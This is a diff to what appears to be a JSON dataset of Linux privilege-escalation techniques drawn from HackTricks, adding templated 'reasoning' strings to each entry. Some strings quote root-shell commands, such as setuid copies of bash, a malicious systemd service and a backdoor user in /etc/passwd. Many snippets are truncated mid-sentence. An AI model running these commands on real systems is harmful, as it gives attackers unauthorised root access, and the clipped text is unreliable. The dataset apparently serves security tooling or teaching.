@@ -20,7 +20,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: OS info. Target OS: linux. Has 3 associated commands. Let's start gaining some knowledge of the OS running Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -34,7 +34,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Path. Target OS: linux. Has 1 associated commands. If you  have write permissions on any folder inside the  PATH  variable you may be able to hijack some libraries or binaries: Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -48,7 +48,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Env info. Target OS: linux. Has 1 associated commands. Interesting information, passwords or API keys in the environment variables? Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -77,7 +77,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Kernel exploits. Target OS: linux. Has 4 associated commands. Check the kernel version and if there is some exploit that can be used to escalate privileges You can find a good vulnerable kernel list and some already  compiled exploits  here: [https://github. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -96,7 +96,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Sudo version. Target OS: linux. Has 2 associated commands. Based on the vulnerable sudo versions that appear in: You can check if the sudo version is vulnerable using this grep. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -110,7 +110,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: sudo < v1.8.28. Target OS: linux. Has 1 associated commands. From @sickrov Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -124,7 +124,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Dmesg signature verification failed. Target OS: linux. Has 1 associated commands. Check  smasher2 box of HTB  for an  example  of how this vuln could be exploited Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -153,7 +153,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: More system enumeration. Target OS: linux. Has 4 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -207,7 +207,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: AppArmor. Target OS: linux. Has 9 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -221,7 +221,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Grsecurity. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -235,7 +235,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PaX. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -249,7 +249,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Execshield. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -263,7 +263,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SElinux. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -277,7 +277,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: ASLR. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -301,7 +301,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Drives. Target OS: linux. Has 3 associated commands. Check  what is mounted and unmounted , where and why. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -320,7 +320,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Useful software. Target OS: linux. Has 2 associated commands. Enumerate useful binaries Also, check if  any compiler is installed . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -339,7 +339,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Vulnerable Software Installed. Target OS: linux. Has 2 associated commands. Check for the  version of the installed packages and services . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -363,7 +363,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Processes. Target OS: linux. Has 3 associated commands. Take a look at  what processes  are being executed and check if any process has  more privileges than it should  (maybe a tomcat being executed by root?) Always check for possible [ electron/cef/chrom Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -402,7 +402,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: GDB. Target OS: linux. Has 6 associated commands. If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -461,7 +461,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: /proc/$pid/maps & /proc/$pid/mem. Target OS: linux. Has 10 associated commands. For a given process ID,  maps show how memory is mapped within that process's  virtual address space; it also shows the  permissions of each mapped region . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -475,7 +475,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: /dev/mem. Target OS: linux. Has 1 associated commands. /dev/mem  provides access to the system's  physical  memory, not the virtual memory. The kernel's virtual address space can be accessed using /dev/kmem. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -569,7 +569,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: ProcDump for linux. Target OS: linux. Has 17 associated commands. ProcDump is a Linux reimagining of the classic ProcDump tool from the Sysinternals suite of tools for Windows. Get it in [https://github.com/Sysinternals/ProcDump-for-Linux](https://github. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -598,7 +598,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Manual example. Target OS: linux. Has 4 associated commands. If you find that the authenticator process is running: You can dump the process (see before sections to find different ways to dump the memory of a process) and search for credentials inside the memor Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -612,7 +612,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: browse http://localhost:9001 and authenticate. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -656,7 +656,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Command:. Target OS: linux. Has 7 associated commands. cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell bash /tmp/rootshell -p     root shell bash crontab -l ls -al /etc/cron  /etc/at cat /etc/cron  /etc/at  /etc/anacrontab /var/spool/cron/crontab Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -675,7 +675,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Cron path. Target OS: linux. Has 2 associated commands. For example, inside _/etc/crontab_ you can find the PATH: _PATH= /home/user :/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_ (_Note how the user \"user\" has writing privileges over /home/ Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -689,7 +689,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Cron using a script with a wildcard (Wildcard Injection). Target OS: linux. Has 1 associated commands. If a script is executed by root has a “ \\ ” inside a command, you could exploit this to make unexpected things (like privesc). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -713,7 +713,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Cron script overwriting and symlink. Target OS: linux. Has 3 associated commands. If you  can modify a cron script  executed by root, you can get a shell very easily: If the script executed by root uses a  directory where you have full access , maybe it could be useful to delete th Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -732,7 +732,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Symlink validation and safer file handling. Target OS: linux. Has 2 associated commands. When reviewing privileged scripts/binaries that read or write files by path, verify how links are handled: -  stat()  follows a symlink and returns metadata of the target. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -746,7 +746,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Frequent cron jobs. Target OS: linux. Has 1 associated commands. You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges. For example, to  monitor every 0. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -775,7 +775,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: systemd PATH - Relative Paths. Target OS: linux. Has 4 associated commands. You can see the PATH used by  systemd  with: If you find that you can  write  in any of the folders of the path you may be able to  escalate privileges . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -789,7 +789,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Timers**. Target OS: linux. Has 1 associated commands. Timers  are systemd unit files whose name ends in  .timer  that control  .service  files or events. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -803,7 +803,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Writable timers. Target OS: linux. Has 1 associated commands. If you can modify a timer you can make it execute some existents of systemd.unit (like a  .service  or a  . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -822,7 +822,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Enabling Timer**. Target OS: linux. Has 2 associated commands. To enable a timer you need root privileges and to execute: Note the  timer  is  activated  by creating a symlink to it on  /etc/systemd/system/<WantedBy_section>.wants/<name>. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -866,7 +866,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Service=vuln.service. Target OS: linux. Has 7 associated commands. bash cat >/etc/systemd/system/vuln.service <<'EOF' [Service] Type=oneshot ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash' EOF nc -q0 127.0.0. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -880,7 +880,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Enumerate Unix Sockets. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -904,7 +904,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Raw connection. Target OS: linux. Has 3 associated commands. Exploitation example: {{ ref}} socket-command-injection. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -918,7 +918,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: HTTP sockets. Target OS: linux. Has 1 associated commands. Note that there may be some  sockets listening for HTTP  requests (_I'm not talking about .socket files but the files acting as unix sockets_). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -937,7 +937,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Privilege Escalation with Docker CLI**. Target OS: linux. Has 2 associated commands. If you have write access to the Docker socket, you can escalate privileges using the following commands: These commands allow you to run a container with root-level access to the host's file system. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1046,7 +1046,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Generic enumeration. Target OS: linux. Has 20 associated commands. bash Hostname, hosts and DNS cat /etc/hostname /etc/hosts /etc/resolv.conf dnsdomainname NSS resolution order (hosts file vs DNS) grep -E '^(hosts|networks):' /etc/nsswitch. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1075,7 +1075,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Open ports. Target OS: linux. Has 4 associated commands. Always check network services running on the machine that you weren't able to interact with before accessing it: Classify listeners by bind target: -  0.0.0. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1193,7 +1193,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Generic Enumeration. Target OS: linux. Has 11 associated commands. Check  who  you are, which  privileges  do you have, which  users  are in the systems, which ones can  login  and which ones have  root privileges: Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1242,7 +1242,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Clipboard. Target OS: linux. Has 8 associated commands. Check if anything interesting is located inside the clipboard (if possible) Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1256,7 +1256,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Password Policy. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1305,7 +1305,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SUDO and SUID. Target OS: linux. Has 8 associated commands. You could be allowed to execute some command using sudo or they could have the suid bit. Check it using: Some  unexpected commands allow you to read and/or write files or even execute a command. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1334,7 +1334,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: NOPASSWD. Target OS: linux. Has 4 associated commands. Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1412,7 +1412,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: ~/.terraformrc. Target OS: linux. Has 8 associated commands. provider_installation {   dev_overrides {     \"previous. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1441,7 +1441,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: TF_VAR overrides + symlink validation bypass. Target OS: linux. Has 4 associated commands. Terraform variables can be provided via  TF_VAR_<name>  environment variables, which survive when sudo preserves the environment. Weak validations such as  strcontains(var. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1455,7 +1455,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: requiretty / !requiretty. Target OS: linux. Has 1 associated commands. On some older distributions, sudo can be configured with  requiretty , which forces sudo to run only from an interactive TTY. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1494,7 +1494,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Sudo env_keep+=PATH / insecure secure_path → PATH hijack. Target OS: linux. Has 6 associated commands. If  sudo -l  shows  env_keep+=PATH  or a  secure_path  containing attacker-writable entries (e.g.,  /home/<user>/bin ), any relative command inside the sudo-allowed target can be shadowed. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1533,7 +1533,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Sudo execution bypassing paths. Target OS: linux. Has 6 associated commands. Jump  to read other files or use  symlinks . For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\\ _ If a  wildcard  is used (\\ ), it is even easier: Countermeasures : [https://blog. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1552,7 +1552,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Sudo command/SUID binary without command path. Target OS: linux. Has 2 associated commands. If the  sudo permission  is given to a single command  without specifying the path : _hacker10 ALL= (root) less_ you can exploit it by changing the PATH variable This technique can also be used if a   Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1571,7 +1571,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SUID binary with command path. Target OS: linux. Has 2 associated commands. If the  suid  binary  executes another command specifying the path , then, you can try to  export a function  named as the command that the suid file is calling. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1590,7 +1590,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Writable script executed by a SUID wrapper. Target OS: linux. Has 2 associated commands. A common custom-app misconfiguration is a root-owned SUID binary wrapper that executes a script, while the script itself is writable by low-priv users. Typical pattern: If  /usr/local/bin/backup. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1648,7 +1648,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SUID Binary – .so injection. Target OS: linux. Has 3 associated commands. When encountering a binary with  SUID  permissions that seems unusual, it's a good practice to verify if it's loading  .so  files properly. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1667,7 +1667,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: The SUID also loads libraries from a custom location where we can write. Target OS: linux. Has 2 associated commands. readelf -d payroll  | grep PATH 0x000000000000001d (RUNPATH)            Library runpath: [/development] c //gcc src.c -fPIC -shared -o /development/libshared.so include <stdio.h> include <stdlib. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1725,7 +1725,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: /var/run/sudo/ts/\\<Username>. Target OS: linux. Has 1 associated commands. If you have  write permissions  in the folder or on any of the created files inside the folder you can use the binary [ write_sudo_token ](https://github. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1754,7 +1754,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: /etc/sudoers, /etc/sudoers.d. Target OS: linux. Has 4 associated commands. The file  /etc/sudoers  and the files inside  /etc/sudoers.d  configure who can use  sudo  and how. These files  by default can only be read by user root and group root . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1768,7 +1768,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: DOAS. Target OS: linux. Has 1 associated commands. There are some alternatives to the  sudo  binary such as  doas  for OpenBSD, remember to check its configuration at  /etc/doas. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1837,7 +1837,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: RPATH. Target OS: linux. Has 12 associated commands. By copying the lib into  /var/tmp/flag15/  it will be used by the program in this place as specified in the  RPATH  variable. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1861,7 +1861,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: ACLs. Target OS: linux. Has 3 associated commands. Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of  overriding the traditional ugo/rwx permissions . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1914,7 +1914,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Socket locations (some systems expose one as symlink of the other). Target OS: linux. Has 2 associated commands. ls /run/screen/ /var/run/screen/ 2>/dev/null bash screen -dr <session>  The -d is to detach whoever is attached to it screen -dr 3350. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1938,7 +1938,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: tmux sessions hijacking. Target OS: linux. Has 3 associated commands. This was a problem with  old tmux versions . I wasn't able to hijack a tmux (v2.1) session created by root as a non-privileged user. List tmux sessions ![](<../../images/image (837). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1952,7 +1952,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: AuthorizedKeysFile. Target OS: linux. Has 1 associated commands. Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like  %h , which will be replaced by the home directory. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1985,7 +1985,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Profiles files. Target OS: linux. Has 1 associated commands. The file  /etc/profile  and the files under  /etc/profile.d/  are  scripts that are executed when a user runs a new shell . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2009,7 +2009,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Passwd/Shadow Files. Target OS: linux. Has 3 associated commands. Depending on the OS the  /etc/passwd  and  /etc/shadow  files may be using a different name or there may be a backup. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2073,7 +2073,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Writable /etc/passwd. Target OS: linux. Has 11 associated commands. First, generate a password with one of the following commands. Then add the user  hacker  and add the generated password. E.g:  hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2087,7 +2087,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check Folders. Target OS: linux. Has 1 associated commands. The following folders may contain backups or interesting information:  /tmp ,  /var/tmp ,  /var/backups, /var/mail, /var/spool/mail, /etc/exports, /root  (Probably you won't be able to read the last o Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2141,7 +2141,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Weird Location/Owned files. Target OS: linux. Has 9 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2155,7 +2155,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Modified files in last mins. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2169,7 +2169,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Sqlite DB files. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2183,7 +2183,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: \\*\\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2197,7 +2197,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Hidden files. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2216,7 +2216,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Script/Binaries in PATH**. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2245,7 +2245,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Web files**. Target OS: linux. Has 4 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2259,7 +2259,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Backups**. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2278,7 +2278,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Logs. Target OS: linux. Has 2 associated commands. If you can read logs, you may be able to find  interesting/confidential information inside them . The more strange the log is, the more interesting it will be (probably). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2327,7 +2327,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Shell files. Target OS: linux. Has 8 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2341,7 +2341,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Python library hijacking. Target OS: linux. Has 1 associated commands. If you know from  where  a python script is going to be executed and you  can write inside  that folder or you can  modify python libraries , you can modify the OS library and backdoor it (if you can  Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2365,7 +2365,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: /etc/sysconfig/network-scripts/ (Centos/Redhat). Target OS: linux. Has 3 associated commands. Vulnerability reference:  [ https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\\&qid=e026a0c5f83df4fd532442e1324ffa4f ](https://vulmon. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2384,7 +2384,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Exploitation outline (KernelSU v0.5.7). Target OS: linux. Has 2 associated commands. High-level steps: 1) Build a valid path to your own app data directory to satisfy prefix and ownership checks. 2) Ensure a genuine KernelSU Manager base. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/android-rooting-frameworks-manager-auth-bypass-syscall-hook"
  },
  {
@@ -2458,7 +2458,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Path 1. Target OS: linux. Has 13 associated commands. (Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/cisco-vmanage"
  },
  {
@@ -2517,7 +2517,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Path 2. Target OS: linux. Has 10 associated commands. (Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/cisco-vmanage"
  },
  {
@@ -2561,7 +2561,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
